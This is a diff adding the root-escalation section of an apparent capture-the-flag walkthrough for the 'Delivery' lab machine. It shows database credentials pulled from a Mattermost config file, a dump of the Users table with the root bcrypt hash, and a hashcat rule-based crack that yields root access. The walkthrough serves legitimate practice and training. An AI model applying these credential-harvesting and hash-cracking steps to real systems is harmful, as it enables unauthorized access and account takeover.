@@ -71,3 +71,134 @@ password:Youve_G0t_Mail!
 #using ssh to enter
 
 Bingo now you own the user
+
+# Root
+
+#now we are using maildeliverer
+
+#we will go to the database
+
+/opt/mattermost
+
+find . -type f -name ‘*.config’
+
+json.config
+
+#in sqlsettings
+
+mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)
+
+bingo!!
+
+#credentials to a database
+
+#sql username and password
+
+username:mmuser
+
+pass:Crack_The_MM_Admin_PW
+
+#now we enter the database
+
+mysql --host=127.0.0.1 --user=mmuser --password=Crack_The_MM_Admin_PW
+
+
+show databases;
+Database           |
++--------------------+
+| information_schema |
+| mattermost         |
+
+use mattermost;
+
+show tables;
+
+Tables_in_mattermost   |
++------------------------+
+| Audits                 |
+| Bots                   |
+| ChannelMemberHistory   |
+| ChannelMembers         |
+| Channels               |
+| ClusterDiscovery       |
+| CommandWebhooks        |
+| Commands               |
+| Compliances            |
+| Emoji                  |
+| FileInfo               |
+| GroupChannels          |
+| GroupMembers           |
+| GroupTeams             |
+| IncomingWebhooks       |
+| Jobs                   |
+| Licenses               |
+| LinkMetadata           |
+| OAuthAccessData        |
+| OAuthApps              |
+| OAuthAuthData          |
+| OutgoingWebhooks       |
+| PluginKeyValueStore    |
+| Posts                  |
+| Preferences            |
+| ProductNoticeViewState |
+| PublicChannels         |
+| Reactions              |
+| Roles                  |
+| Schemes                |
+| Sessions               |
+| SidebarCategories      |
+| SidebarChannels        |
+| Status                 |
+| Systems                |
+| TeamMembers            |
+| Teams                  |
+| TermsOfService         |
+| ThreadMemberships      |
+| Threads                |
+| Tokens                 |
+| UploadSessions         |
+| UserAccessTokens       |
+| UserGroups             |
+| UserTermsOfService     |
+| Users                  |
++------------------------+
+
+select * from Users;
+
+| dijg7mcf4tf3xrgxi5ntqdefma | 1608992692294 | 1609157893370 |        0 | root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO | NULL     |             | root@delivery.htb       |             1 |          |                    |          |          | system_admin system_user |              1 | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} |      1609157893370 |                 0 |              0 | en     | {"automaticTimezone":"Africa/Abidjan","manualTimezone":"","useAutomaticTimezone":"true"}   |         0 |           |
+
+
+#we found the hash for the password for the root
+
+now lets get back to the hint that was in 
+
+Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"
+
+so now we know the password is a pattern from PleaseSubscribe!
+
+#we need to know the type of the hash
+
+#search for it at https://hashcat.net/wiki/doku.php?id=example_hashes
+
+#Do Ctrl + f on the page and type $2a$ then which one matches
+
+it is bcrypt $2*$, Blowfish (Unix)
+
+
+echo PleaseSubscribe! > pass.txt is your wordlist
+echo $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO > h.hash is your hash
+
+ls -l /usr/share/hashcat/rules/
+
+#And pick one, one of them will work
+
+root@kali:/usr/share/hashcat/rules# hashcat -m 3200 hash.hash pass.txt -r best64.rule
+
+maildeliverer@Delivery:~$ su root
+
+Password: 
+root@Delivery:/home/maildeliverer# whoami
+
+root
+
+cat /root/root.txt
